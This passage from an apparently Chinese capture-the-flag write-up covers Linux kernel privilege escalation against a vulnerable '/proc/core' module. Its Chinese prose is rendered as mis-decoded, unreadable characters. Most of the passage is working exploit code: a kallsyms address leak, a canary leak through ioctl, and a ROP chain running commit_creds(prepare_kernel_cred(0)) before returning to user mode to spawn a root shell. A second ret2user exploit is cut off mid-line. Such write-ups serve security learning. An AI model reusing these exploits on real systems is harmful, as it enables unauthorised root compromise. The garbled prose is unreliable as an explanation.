 &#125;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span>(!commit_creds &amp; !prepare_kernel_cred)&#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;[*]read kallsyms error!&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">   &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>ä» <code>/proc/kallsyms</code> æ–‡ä»¶ä¸­å¯ä»¥è·å–ä»»æ„ä¸€ä¸ªå‡½æ•°çš„çœŸå®åœ°å€ï¼Œæœ¬é¢˜çš„ <code>init</code> æ–‡ä»¶ä¸­å°† <code>/proc/kallsyms</code> æ–‡ä»¶ <code>copy</code> äº†ä¸€ä»½å«åš <code>/tmp/kallsyms</code> ï¼Œè¯»å–è¯¥æ–‡ä»¶ï¼Œå³å¯å¾—åˆ°å‡½æ•°çš„çœŸå®åœ°å€ï¼Œä½†å¦‚æœæƒ³è·å– <code>vmlinux</code> ä¸­çš„åŸºåœ°å€ï¼Œæˆ‘ä»¬è¿˜éœ€è¦æ‹¿åˆ°å‡½æ•°åœ¨ <code>vmlinux</code> ä¸­çš„åç§»ã€‚</p><h5 id="è·å–vmlinuxä¸­çš„å‡½æ•°åç§»"><a href="#è·å–vmlinuxä¸­çš„å‡½æ•°åç§»" class="headerlink" title="è·å–vmlinuxä¸­çš„å‡½æ•°åç§»"></a>è·å–vmlinuxä¸­çš„å‡½æ•°åç§»</h5><p>å› ä¸ºå¼€äº† <code>KASLR</code> ï¼Œæ‰€ä»¥å‡½æ•°çš„çœŸå®åœ°å€éœ€è¦è·å–åŸºåœ°å€å’Œå‡½æ•°åç§»æ‰è¡Œã€‚</p><p>ä½¿ç”¨ <code>readelf -s vmlinux | grep vuln</code> è·å–å…¶åœ°å€ï¼ˆå¦‚ä¸‹ï¼‰</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304051802154.png" alt="image-20230405180248088"></p><p>ç„¶åå†ç”¨ <code>checksec</code> å‘½ä»¤æ¥è·å–åŸºåœ°å€ï¼ˆå¦‚ä¸‹ï¼‰</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304051804686.png" alt="image-20230405180406627"></p><p>å¾—åˆ° <code>prepare_kernel_cred</code> çš„åç§»ä¸º <code>0x9cce0</code>  , <code>commit_creds</code> å‡½æ•°çš„åç§»ä¸º <code>0x9c8e0</code> </p><p>æŠŠè¿™äº›åç§»å†™å›åˆ°ä¸Šé¢çš„è„šæœ¬å³å¯ï¼Œä¹‹æ‰€ä»¥è¦æ‹¿åˆ° <code>vmlinux</code> çš„åŸºåœ°å€æ˜¯å› ä¸ºåç»­çš„ <code>gadget</code> åç§»éœ€è¦åŠ ä¸ŠåŸºåœ°å€æ‰èƒ½å¾—åˆ° <code>gadget</code> çš„çœŸå®åœ°å€ã€‚</p><h4 id="è·å–-gadget"><a href="#è·å–-gadget" class="headerlink" title="è·å– gadget"></a>è·å– <code>gadget</code></h4><p>å¦‚ä¸‹æ–¹æ³•æŸ¥çœ‹ <code>gadget</code> ä¼šæ¯”è¾ƒæ–¹ä¾¿</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ROPgadget --binary vmlinux &gt; ropgadget</span><br><span class="line">grep &#x27;: pop rdi ; ret&#x27; ropgadget </span><br></pre></td></tr></table></figure><p>æˆ–è€…ç”¨ <code>vscode</code> æ‰“å¼€ <code>ropgadget</code> æ–‡ä»¶ï¼Œ <code>ctrl+f</code> æ¥æœç´¢ä¹Ÿå¯ä»¥</p><p>æ‰¾åˆ°çš„ <code>gadget</code> éœ€è¦å…ˆå‡å» <code>vmlinux</code> çš„åŸºåœ°å€å¾—åˆ° <code>gadget</code> çš„åç§»</p><p>æœ€ååœ¨ <code>exp</code> ä¸­ï¼Œä¸€ä¸ª <code>gadget</code> çš„çœŸå®åœ°å€åº”è¯¥æ˜¯ <code>vmlinux_base</code> åŠ ä¸Šå…¶åç§»</p><h4 id="ROP-é“¾çš„å¸ƒç½®"><a href="#ROP-é“¾çš„å¸ƒç½®" class="headerlink" title="ROP é“¾çš„å¸ƒç½®"></a><code>ROP</code> é“¾çš„å¸ƒç½®</h4><p>æˆ‘ä»¬æœ€åå¸Œæœ›ç”¨ <code>ROP</code> æ¥æ‰§è¡Œ <code>commit_creds(prepare_kernel_cred(0))</code> ï¼Œ<code>prepare_kernel_cred(0)</code> ä¼šè¿”å›ä¸€ä¸ª <code>root</code> æƒé™çš„ <code>cred</code> ç»“æ„ä½“æŒ‡é’ˆï¼Œè€Œ <code>commit_creds</code> å‡½æ•°å¯ä»¥å°†è¯¥ç»“æ„ä½“æŒ‡é’ˆä½œç”¨äºå½“å‰è¿›ç¨‹ï¼Œæ¥ç€æˆ‘ä»¬è¿”å›ç”¨æˆ·æ€ï¼Œå»æ‰§è¡Œä¸€ä¸ª <code>system(&quot;/bin/sh&quot;)</code> ä¾¿å¯ä»¥ç¨³å®šçš„ä»¥ <code>root</code> æƒé™æ‰§è¡Œå‘½ä»¤äº†ã€‚</p><p>æ­£å¸¸æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬éœ€è¦ç”¨ <code>pop rdi ; ret</code> è¿™ä¸ª <code>gadget</code> æ¥æ§åˆ¶ <code>prepare_kernel_cred</code> å‡½æ•°çš„å‚æ•°ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥æˆåŠŸæœåˆ°è¿™ä¸ª <code>gadget</code> ï¼Œä½†é—®é¢˜åœ¨äºæ²¡æœ‰ <code>mov rdi,rax ; ret</code> è¿™ä¸ª <code>gadget</code> æ¥ä¼ é€’ç»™ <code>commit_creds</code> å‡½æ•°å‚æ•°ï¼Œé€šè¿‡æœç´¢å‘ç°å…·æœ‰ä¸€ä¸ª <code>mov rdi, rax ; jmp rdx</code> è¿™ä¸ª <code>gadget</code> ï¼Œå¹¶ä¸”å­˜åœ¨ <code>pop rdx ; ret</code> æ¥æ§åˆ¶ <code>rdx</code> ï¼Œå› æ­¤ <code>rop</code> é“¾çš„å¸ƒç½®å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">size_t</span> rop[<span class="number">0x400</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="type">int</span> i=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">8</span>;i++)</span><br><span class="line">&#123;</span><br><span class="line">   rop[i]=<span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">rop[i++]=canary;</span><br><span class="line">rop[i++]=<span class="number">0xdeadbeefdeadbeef</span>;<span class="comment">//rbp(junk)</span></span><br><span class="line">rop[i++]=vmlinux_base+<span class="number">0xb2f</span>;<span class="comment">//pop rdi ; ret</span></span><br><span class="line">rop[i++]=<span class="number">0</span>;</span><br><span class="line">rop[i++]=prepare_kernel_cred;<span class="comment">//commit_creds(prepare_kernel_cred(0))</span></span><br><span class="line"></span><br><span class="line">rop[i++]=vmlinux_base+<span class="number">0xa0f49</span>; <span class="comment">//pop rdx ; ret</span></span><br><span class="line">rop[i++]=commit_creds;</span><br><span class="line">rop[i++]=vmlinux_base+<span class="number">0x6a6d2</span>; <span class="comment">//mov rdi, rax ; jmp rdx</span></span><br></pre></td></tr></table></figure><p>æ­¤æ—¶ <code>commit_creds(prepare_kernel_cred(0))</code> æ‰§è¡Œå®Œæ¯•ï¼Œä½†éœ€è¦æ¥ç¨³å›ºç¨‹åºï¼Œå› ä¸ºåœ¨å†…æ ¸æ€æ ˆæº¢å‡ºåï¼Œæ ˆä¸­çš„ä¸€äº›æ•°æ®è¢«æŸåï¼Œå…¶ä¸­åŒ…æ‹¬äº†ç”¨æˆ·æ€çš„çŠ¶æ€ä¿¡æ¯ï¼Œä¸€æ—¦æŸå¤±äº†è¿™äº›ä¿¡æ¯ï¼Œé‡æ–°åˆ‡æ¢åˆ°ç”¨æˆ·æ€æ—¶ç³»ç»Ÿå°±ä¼šå´©æºƒã€‚æ‰€ä»¥æˆ‘ä»¬è¦åœ¨æ”»å‡»ä¹‹å‰å…ˆä¿å­˜ä¸€ä¸‹çŠ¶æ€ä¿¡æ¯ï¼Œå°†å…¶æ„é€ åœ¨å†…æ ¸æ ˆä¸­ï¼Œæœ€åè¿”å›çš„æ—¶å€™å°±æ˜¯æ­£å¸¸çš„ã€‚</p><p>ç³»ç»Ÿæƒé™åˆ†ä¸ºå†…æ ¸æ€å’Œç”¨æˆ·æ€ï¼Œåˆ†ç¦»çš„å®ç°æ˜¯ <code>swapgs</code> æŒ‡ä»¤ï¼Œè¯¥æŒ‡ä»¤å°† <code>gs</code> å¯„å­˜å™¨çš„å€¼ä¸ <code>IA32_KERNEL_GS_BASE MSR</code> åœ°å€ä¸­çš„å€¼äº¤æ¢ã€‚å†…æ ¸æ€å¸¸è§„æ“ä½œï¼ˆå¦‚ç³»ç»Ÿè°ƒç”¨ï¼‰çš„å…¥å£å¤„ï¼Œæ‰§è¡Œ <code>swapgs</code> æŒ‡ä»¤è·å¾—æŒ‡å‘å†…æ ¸æ•°æ®ç»“æ„çš„æŒ‡é’ˆï¼Œé‚£ä¹ˆå¯¹åº”çš„ï¼Œ ä»å†…æ ¸æ€é€€å‡ºï¼Œè¿”å›åˆ°ç”¨æˆ·æ€æ—¶ä¹Ÿéœ€æ‰§è¡Œä¸€ä¸‹ <code>swapgs</code> </p><p><code>iretq</code> æŒ‡ä»¤ç”¨æ¥æ¢å¤ç”¨æˆ·ç©ºé—´ï¼Œå®ƒä¼šä»æ ˆä¸­å¼¹å‡ºå·²ç»ä¿å­˜çš„ <code>RIP</code> <code>CS</code> <code>RFLAGS</code> <code>RSP</code> <code>SS</code> æ¢å¤ä¹‹å‰çš„æ‰§è¡Œç¯å¢ƒï¼Œæ‰€ä»¥æœ€åæ‰§è¡Œ <code>iretq</code> æŒ‡ä»¤ï¼Œæ¢å¤æœ€å¼€å§‹ä¿å­˜çš„å¯„å­˜å™¨å€¼å³å¯ã€‚</p><p>æ‰€ä»¥ <code>ROP</code> é“¾çš„éƒ¨åˆ†ä¸º</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">size_t</span> rop[<span class="number">0x400</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="type">int</span> i=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">8</span>;i++)</span><br><span class="line">&#123;</span><br><span class="line">   rop[i]=<span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">rop[i++]=canary;</span><br><span class="line">rop[i++]=<span class="number">0xdeadbeefdeadbeef</span>;<span class="comment">//rbp(junk)</span></span><br><span class="line">rop[i++]=vmlinux_base+<span class="number">0xb2f</span>;<span class="comment">//pop rdi ; ret</span></span><br><span class="line">rop[i++]=<span class="number">0</span>;</span><br><span class="line">rop[i++]=prepare_kernel_cred;<span class="comment">//commit_creds(prepare_kernel_cred(0))</span></span><br><span class="line"></span><br><span class="line">rop[i++]=vmlinux_base+<span class="number">0xa0f49</span>; <span class="comment">//pop rdx ; ret</span></span><br><span class="line">rop[i++]=commit_creds;</span><br><span class="line">rop[i++]=vmlinux_base+<span class="number">0x6a6d2</span>; <span class="comment">//mov rdi, rax ; jmp rdx</span></span><br><span class="line"></span><br><span class="line">rop[i++]=vmlinux_base+<span class="number">0xa012da</span>;<span class="comment">//swapgs; popfq; ret</span></span><br><span class="line">rop[i++]=<span class="number">0</span>;</span><br><span class="line">rop[i++] = vmlinux_base + <span class="number">0x50ac2</span>;      <span class="comment">//iretp_ret</span></span><br><span class="line">rop[i++] = (<span class="type">size_t</span>)get_shell; <span class="comment">//RIP</span></span><br><span class="line">rop[i++] = user_cs;<span class="comment">//CS</span></span><br><span class="line">rop[i++] = user_rflags;<span class="comment">//rflags</span></span><br><span class="line">rop[i++] = user_sp;<span class="comment">//RSP</span></span><br><span class="line">rop[i++] = user_ss;<span class="comment">//SS</span></span><br></pre></td></tr></table></figure><p>ä¸‹é¢ä¸¤å¼ å›¾ç‰‡æ˜¯ <code>iretq</code> æŒ‡ä»¤æ‰§è¡Œå‰åçš„æƒ…å†µï¼Œå¯ä»¥çœ‹åˆ°å·²ç»ä»å†…æ ¸æ€åˆ‡æ¢åˆ°äº†ç”¨æˆ·æ€ï¼ˆå¦‚ä¸‹ï¼‰</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304081840059.png" alt="image-20230408183923247"></p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304081840996.png" alt="image-20230408183934789"></p><p>å› ä¸º <code>RIP</code> è®¾ç½®çš„æ˜¯ç”¨æˆ·æ€ä¸­ <code>system(&quot;/bin/sh&quot;)</code> çš„åœ°å€ï¼Œå› æ­¤å¼€å¯äº†æ–°çš„ <code>root shell</code> ï¼ˆå¦‚ä¸‹ï¼‰</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304081843627.png" alt="image-20230408184359505"></p><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="type">size_t</span> commit_creds = <span class="number">0</span>,prepare_kernel_cred = <span class="number">0</span>,vmlinux_base = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> <span class="title function_">find_symbols</span><span class="params">()</span>&#123;</span><br><span class="line">   FILE* kallsyms_fd = fopen(<span class="string">&quot;/tmp/kallsyms&quot;</span>,<span class="string">&quot;r&quot;</span>);</span><br><span class="line">   <span class="keyword">if</span>(kallsyms_fd &lt; <span class="number">0</span>)&#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;[*]open kallsyms error!&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="type">char</span> buf[<span class="number">0x30</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">   <span class="keyword">while</span>(fgets(buf,<span class="number">0x30</span>,kallsyms_fd))&#123;</span><br><span class="line">      <span class="keyword">if</span>(commit_creds &amp; prepare_kernel_cred)</span><br><span class="line">         <span class="keyword">return</span> <span class="number">0</span>;<span class="comment">//End condition</span></span><br><span class="line">      <span class="comment">//find commit_creds</span></span><br><span class="line">      <span class="keyword">if</span>(<span class="built_in">strstr</span>(buf,<span class="string">&quot;commit_creds&quot;</span>) &amp;&amp; !commit_creds)&#123;</span><br><span class="line">         <span class="type">char</span> hex[<span class="number">20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">         <span class="built_in">strncpy</span>(hex,buf,<span class="number">16</span>);</span><br><span class="line">         <span class="built_in">sscanf</span>(hex,<span class="string">&quot;%llx&quot;</span>,&amp;commit_creds);</span><br><span class="line">         <span class="built_in">printf</span>(<span class="string">&quot;commit_creds addr: %p\n&quot;</span>,commit_creds);</span><br><span class="line">         vmlinux_base = commit_creds - <span class="number">0x9c8e0</span>;</span><br><span class="line">         <span class="built_in">printf</span>(<span class="string">&quot;vmlinux_base addr: %p\n&quot;</span>,vmlinux_base);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">//find prepare_kernel_cred</span></span><br><span class="line">      <span class="keyword">if</span>(<span class="built_in">strstr</span>(buf,<span class="string">&quot;prepare_kernel_cred&quot;</span>) &amp;&amp; !prepare_kernel_cred)&#123;</span><br><span class="line">         <span class="type">char</span> hex[<span class="number">20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">         <span class="built_in">strncpy</span>(hex,buf,<span class="number">16</span>);</span><br><span class="line">         <span class="built_in">sscanf</span>(hex,<span class="string">&quot;%llx&quot;</span>,&amp;prepare_kernel_cred);</span><br><span class="line">         <span class="built_in">printf</span>(<span class="string">&quot;prepare_kernel_cred addr: %p\n&quot;</span>,prepare_kernel_cred);</span><br><span class="line">         vmlinux_base = prepare_kernel_cred - <span class="number">0x9cce0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span>(!commit_creds &amp; !prepare_kernel_cred)&#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;[*]read kallsyms error!&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">   &#125;</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> user_rflags,user_ss,user_cs,user_sp;</span><br><span class="line"> <span class="type">void</span> <span class="title function_">save_stats</span><span class="params">()</span>&#123;</span><br><span class="line"><span class="keyword">asm</span>(</span><br><span class="line"><span class="string">&quot;movq %%cs, %0\n&quot;</span></span><br><span class="line"><span class="string">&quot;movq %%ss, %1\n&quot;</span></span><br><span class="line"><span class="string">&quot;movq %%rsp, %3\n&quot;</span></span><br><span class="line"><span class="string">&quot;pushfq\n&quot;</span></span><br><span class="line"><span class="string">&quot;popq %2\n&quot;</span></span><br><span class="line">:<span class="string">&quot;=r&quot;</span>(user_cs), <span class="string">&quot;=r&quot;</span>(user_ss), <span class="string">&quot;=r&quot;</span>(user_rflags),<span class="string">&quot;=r&quot;</span>(user_sp)</span><br><span class="line"> :</span><br><span class="line"> : <span class="string">&quot;memory&quot;</span></span><br><span class="line"> );</span><br><span class="line">   <span class="built_in">puts</span>(<span class="string">&quot;[*]status has been saved.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">get_shell</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">   <span class="built_in">puts</span>(<span class="string">&quot;[*] get shell successfully!&quot;</span>);</span><br><span class="line">   system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">   <span class="type">size_t</span> canary=<span class="number">0</span>;</span><br><span class="line">   <span class="type">size_t</span> buf[<span class="number">0x80</span>];</span><br><span class="line">   save_stats();</span><br><span class="line">   <span class="type">int</span> fd=open(<span class="string">&quot;/proc/core&quot;</span>,O_RDWR);</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;core fd is %d\n&quot;</span>,fd);</span><br><span class="line"></span><br><span class="line">   ioctl(fd,<span class="number">0x6677889C</span>,<span class="number">0x40</span>);</span><br><span class="line">   ioctl(fd,<span class="number">0x6677889B</span>,&amp;buf);</span><br><span class="line">   canary=(<span class="type">size_t</span>)(buf[<span class="number">0</span>]);</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;canary is %p\n&quot;</span>,canary);</span><br><span class="line">   find_symbols();</span><br><span class="line"></span><br><span class="line">   <span class="type">size_t</span> rop[<span class="number">0x400</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">   <span class="type">int</span> i=<span class="number">0</span>;</span><br><span class="line">   <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">8</span>;i++)</span><br><span class="line">   &#123;</span><br><span class="line">      rop[i]=<span class="number">0</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   rop[i++]=canary;</span><br><span class="line">   rop[i++]=<span class="number">0xdeadbeefdeadbeef</span>;<span class="comment">//rbp(junk)</span></span><br><span class="line">   rop[i++]=vmlinux_base+<span class="number">0xb2f</span>;<span class="comment">//pop rdi ; ret</span></span><br><span class="line">   rop[i++]=<span class="number">0</span>;</span><br><span class="line">   rop[i++]=prepare_kernel_cred;<span class="comment">//commit_creds(prepare_kernel_cred(0))</span></span><br><span class="line"></span><br><span class="line">   rop[i++]=vmlinux_base+<span class="number">0xa0f49</span>; <span class="comment">//pop rdx ; ret</span></span><br><span class="line">   rop[i++]=commit_creds;</span><br><span class="line">   rop[i++]=vmlinux_base+<span class="number">0x6a6d2</span>; <span class="comment">//mov rdi, rax ; jmp rdx</span></span><br><span class="line">   </span><br><span class="line">   rop[i++]=vmlinux_base+<span class="number">0xa012da</span>;<span class="comment">//swapgs; popfq; ret</span></span><br><span class="line">   rop[i++]=<span class="number">0</span>;</span><br><span class="line">   rop[i++] = vmlinux_base + <span class="number">0x50ac2</span>;      <span class="comment">//iretp_ret</span></span><br><span class="line">   rop[i++] = (<span class="type">size_t</span>)get_shell; <span class="comment">//RIP</span></span><br><span class="line">   rop[i++] = user_cs;<span class="comment">//CS</span></span><br><span class="line">   rop[i++] = user_rflags;<span class="comment">//rflags</span></span><br><span class="line">   rop[i++] = user_sp;<span class="comment">//RSP</span></span><br><span class="line">   rop[i++] = user_ss;<span class="comment">//SS</span></span><br><span class="line"></span><br><span class="line">   write(fd,rop,<span class="number">0x400</span>);</span><br><span class="line">   ioctl(fd,<span class="number">0x6677889A</span>,<span class="number">0xffffffffffff0000</span> | (<span class="number">0xd0</span>));</span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="ret2user"><a href="#ret2user" class="headerlink" title="ret2user"></a>ret2user</h2><p><code>ret2user</code> å’Œä¸Šé¢çš„ <code>ROP</code> éå¸¸ç›¸ä¼¼ï¼ˆæ¯•ç«Ÿæœ¬è´¨ä¸Šè¿˜æ˜¯ <code>ROP</code> ï¼‰ï¼Œç»™æˆ‘çš„æ„Ÿè§‰æ˜¯ <code>ret2user</code> åœ¨æ§åˆ¶å‚æ•°æ–¹é¢æœ‰å¾ˆå¤§çš„ä¼˜åŠ¿ï¼Œå®ƒæ˜¯å°†æ‰§è¡Œæµè¿”å›åˆ°äº†ç”¨æˆ·æ€ä¸­å¸ƒç½®çš„å‡½æ•°ä¸Šï¼Œè™½ç„¶æ‰§è¡Œçš„å‡½æ•°æ˜¯ä½äºå†…æ ¸ç©ºé—´ï¼Œä½†å› ä¸ºæˆ‘ä»¬çš„æƒé™æ˜¯ <code>ring 0</code>ï¼Œå› æ­¤ä¾ç„¶å¯ä»¥æ­£å¸¸è¿è¡Œã€‚å…¶æ ¹æœ¬åŸå› æ˜¯å› ä¸ºå†…æ ¸ç©ºé—´å¯ä»¥è®¿é—®ç”¨æˆ·ç©ºé—´çš„è¿›ç¨‹ï¼ˆåä¹‹åˆ™ä¸è¡Œï¼‰ï¼Œä»¥å†…æ ¸çš„æƒé™æ‰§è¡Œç”¨æˆ·ç©ºé—´çš„ä»£ç å®Œæˆææƒï¼ˆå‰ææ˜¯æ²¡æœ‰å¼€å¯ <code>SMEP</code> ä¿æŠ¤ï¼‰</p><h3 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="type">size_t</span> commit_creds = <span class="number">0</span>,prepare_kernel_cred = <span class="number">0</span>,vmlinux_base = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> <span class="title function_">find_symbols</span><span class="params">()</span>&#123;</span><br><span class="line">   FILE* kallsyms_fd = fopen(<span class="string">&quot;/tmp/kallsyms&quot;</span>,<span class="string">&quot;r&quot;</span>);</span><br><span class="line">   <span class="keyword">if</span>(kallsyms_fd &lt; <span class="number">0</span>)&#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;[*]open kallsyms error!&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">   &#125;</span><br><span class="line">    </span><br><span class="line">   <span class="type">char</span> buf[<span class="number">0x30</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">   <span class="keyword">while</span>(fgets(buf,<span class="number">0x30</span>,kallsyms_fd))&#123;</span><br><span class="line">      <span class="keyword">if</span>(commit_creds &amp; prepare_kernel_cred)</span><br><span class="line">         <span class="keyword">return</span> <span class="number">0</span>;<span class="comment">//End condition</span></span><br><span class="line">      <span class="comment">//find commit_creds</span></span><br><span class="line">      <span class="keyword">if</span>(<span class="built_in">strstr</span>(buf,<span class="string">&quot;commit_creds&quot;</span>) &amp;&amp; !commit_creds)&#123;</span><br><span class="line">         <span class="type">char</span> hex[<span class="number">20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">         <span class="built_in">strncpy</span>(hex,buf,<span class="number">16</span>);</span><br><span class="line">         <span class="built_in">sscanf</span>(hex,<span class="string">&quot;%llx&quot;</span>,&amp;commit_creds);</span><br><span class="line">         <span class="built_in">printf</span>(<span class="string">&quot;commit_creds addr: %p\n&quot;</span>,commit_creds);</span><br><span class="line">         vmlinux_base = commit_creds - <span class="number">0x9c8e0</span>;</span><br><span class="line">         <span class="built_in">printf</span>(<span class="string">&quot;vmlinux_base addr: %p\n&quot;</span>,vmlinux_base);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">//find prepare_kernel_cred</span></span><br><span class="line">      <span class="keyword">if</span>(<span class="built_in">strstr</span>(buf,<span class="string">&quot;prepare_kernel_cred&quot;</span>) &amp;&amp; !prepare_kernel_cred)&#123;</span><br><span class="line">         <span class="type">char</span> hex[<span class="number">20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">         <span class="built_in">strncpy</span>(hex,buf,<span class="number">16</span>);</span><br><span class="line">         <span class="built_in">sscanf</span>(hex,<span class="string">&quot;%llx&quot;</span>,&amp;prepare_kernel_cred);</span><br><span class="line">         <span class="built_in">printf</span>(<span class="string">&quot;prepare_kernel_cred addr: %p\n&quot;</span>,prepare_kernel_cred);</span><br><span class="line">         vmlinux_base = prepare_kernel_cred - <span class="number">0x9cce0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span>(!commit_creds &amp; !prepare_kernel_cred)&#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;[*]read kallsyms error!&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">   &#125;</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> user_rflags,user_ss,user_cs,user_sp;</span><br><span class="line"> <span class="type">void</span> <span class="title function_">save_stats</span><span class="params">()</span>&#123;</span><br><span class="line"><span class="keyword">asm</span>(</span><br><span class="line"><span class="string">&quot;movq %%cs, %0\n&quot;</span></span><br><span class="line"><span class="string">&quot;movq %%ss, %1\n&quot;</span></span><br><span class="line"><span class="string">&quot;movq %%rsp, %3\n&quot;</span></span><br><span class="line"><span class="string">&quot;pushfq\n&quot;</span></span><br><span class="line"><span class="string">&quot;popq %2\n&quot;</span></span><br><span class="line">:<span class="string">&quot;=r&quot;</span>(user_cs), <span class="string">&quot;=r&quot;</span>(user_ss), <span class="string">&quot;=r&quot;</span>(user_rflags),<span class="string">&quot;=r&quot;</span>(user_sp)</span><br><span class="line"> :</span><br><span class="line"> : <span class="string">&quot;memory&quot;</span></span><br><span class="line"> );</span><br><span class="line">   <span class="built_in">puts</span>(<span class="string">&quot;[*]status has been saved.&quot;</span>);</span><br><span class="line">   <span class="built_in">puts</span>(<span class="string">&quot;[*] ret2user [*]&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">get_shell</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">   <span class="built_in">puts</span>(<span class="string">&quot;[*] get shell successfully!&quot;</span>);</span><br><span class="line">   system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">get_root</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span>* (*pkc)(<span class="type">int</span>) = prepare_kernel_cred;</span><br><span class="line">    <span class="type">void</span> (*cc)(<span class="type">char</span>*) = commit_creds;</span><br><span class="line">    (*cc)((*pkc)(<span class="number">0</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">   <span class="type">size_t</span> canary=<span class="number">0</span>;</span><br><span class="line">   <span class="type">size_t</span> buf[<span class="number">0x80</span>];</span><br><span class="line">   save_stats();</span><br><span class="line">   <span class="type">int</span> fd=open(<span class="string">&quot;/proc/core&quot;</span>,O_RDWR);</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;core fd is %d\n&quot;</span>,fd);</span><br><span class="line"></span><br><span class="line">   ioctl(fd,<span 